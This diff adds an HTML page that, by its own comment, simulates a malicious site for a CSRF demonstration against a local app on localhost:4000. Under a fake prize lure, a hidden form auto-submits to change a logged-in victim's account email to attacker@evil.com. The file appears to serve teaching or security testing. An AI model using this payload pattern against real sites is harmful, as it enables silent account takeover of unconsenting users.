@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<!--
+  attacker-page.html
+  Simulates a malicious third-party page. If a logged-in victim visits
+  this page, their browser automatically attaches their session cookie
+  for localhost:4000, and the form below silently submits, changing
+  their account email without their knowledge or consent.
+-->
+<html>
+<head><title>Free Prize Giveaway!</title></head>
+<body>
+  <h1>You won a prize! Claim it now...</h1>
+  <form action="http://localhost:4000/account/update-email" method="POST" id="csrf-form">
+    <input type="hidden" name="newEmail" value="attacker@evil.com">
+  </form>
+  <script>
+    document.getElementById('csrf-form').submit();
+  </script>
+</body>
+</html>
